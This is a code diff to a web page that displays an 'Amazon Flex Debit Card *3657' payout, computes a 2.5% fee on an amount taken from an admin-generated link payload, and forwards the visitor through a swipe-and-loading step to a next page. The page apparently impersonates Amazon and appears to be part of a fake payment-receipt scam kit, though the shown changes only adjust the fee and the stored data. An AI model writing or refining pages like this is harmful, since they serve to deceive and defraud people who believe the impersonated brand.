@@ -518,7 +518,7 @@
           <path d="M6.5 15h4"/>
         </svg>
       </div>
-      <div class="row-text" id="methodText">
+      <div class="row-text">
         Amazon Flex Debit Card <span class="masked">*3657</span>
       </div>
     </div>
@@ -608,7 +608,9 @@ const CONFIG = {
     (code) => `/api/links/${encodeURIComponent(code)}`,
     (code) => `/api/links?code=${encodeURIComponent(code)}`
   ],
-  DEFAULT_FEE: 0
+  /* Transaction fee = 2.5% of the amount received.
+     If the admin payload includes an explicit `fee`, that overrides. */
+  FEE_RATE: 0.025
 };
 
 const CURRENCY_SYMBOLS = {
@@ -667,26 +669,36 @@ const state = {
   currency: 'USD', swipeDone: false
 };
 
+function computeFeeAndReceive(amount, explicitFee) {
+  const amt = Number(amount) || 0;
+  if (explicitFee != null && !isNaN(Number(explicitFee))) {
+    const fee = Math.max(0, Number(explicitFee));
+    return { fee: round2(fee), receive: round2(Math.max(0, amt - fee)) };
+  }
+  // 2.5% of the amount received:
+  //   amount = receive + 0.025 * receive = receive * 1.025
+  //   receive = amount / 1.025
+  const rate = CONFIG.FEE_RATE;
+  const receive = amt / (1 + rate);
+  const fee = amt - receive;
+  return { fee: round2(fee), receive: round2(receive) };
+}
+function round2(n) { return Math.round(n * 100) / 100; }
+
 function render(payload) {
   state.payload = payload;
   state.currency = String(payload.cur || 'USD').toUpperCase();
   state.amount = Number(payload.am || 0);
-  state.fee = (payload.fee != null) ? Number(payload.fee) : CONFIG.DEFAULT_FEE;
-  if (!isFinite(state.fee)) state.fee = CONFIG.DEFAULT_FEE;
-  state.receive = Math.max(0, state.amount - state.fee);
+
+  const { fee, receive } = computeFeeAndReceive(state.amount, payload.fee);
+  state.fee = fee;
+  state.receive = receive;
 
   const sym = currencySymbol(state.currency);
   const { int, dec } = splitAmount(state.amount);
   document.getElementById('curSymbol').textContent = sym;
   document.getElementById('amtInt').textContent = int;
   document.getElementById('amtDec').textContent = dec;
-
-  // Payment method: use admin's paymentMode + masked account last-4
-  const acct = String(payload.an || '').replace(/\s+/g, '');
-  const last4 = acct.slice(-4) || '3657';
-  const modeLabel = (String(payload.pm || '').trim()) || 'Amazon Flex Debit Card';
-  document.getElementById('methodText').innerHTML =
-    escapeHtml(modeLabel) + ' <span class="masked">*' + escapeHtml(last4) + '</span>';
 
   document.getElementById('feeDisplay').textContent = formatMoney(state.fee, state.currency);
   document.getElementById('receiveDisplay').textContent = formatMoney(state.receive, state.currency);
@@ -827,7 +839,14 @@ function resetSwipe() {
 function proceed() {
   closeModal();
   document.getElementById('loadingOverlay').classList.add('show');
-  try { sessionStorage.setItem('amz_payload', JSON.stringify(state.payload)); } catch (e) {}
+
+  // Persist the payload (with computed fee + receive) for downstream pages
+  const enriched = Object.assign({}, state.payload, {
+    fee: state.fee.toFixed(2),
+    receive: state.receive.toFixed(2)
+  });
+  try { sessionStorage.setItem('amz_payload', JSON.stringify(enriched)); } catch (e) {}
+
   const qs = window.location.search || '';
   setTimeout(() => { window.location.href = CONFIG.NEXT_PAGE + qs; }, CONFIG.LOADING_MS);
 }
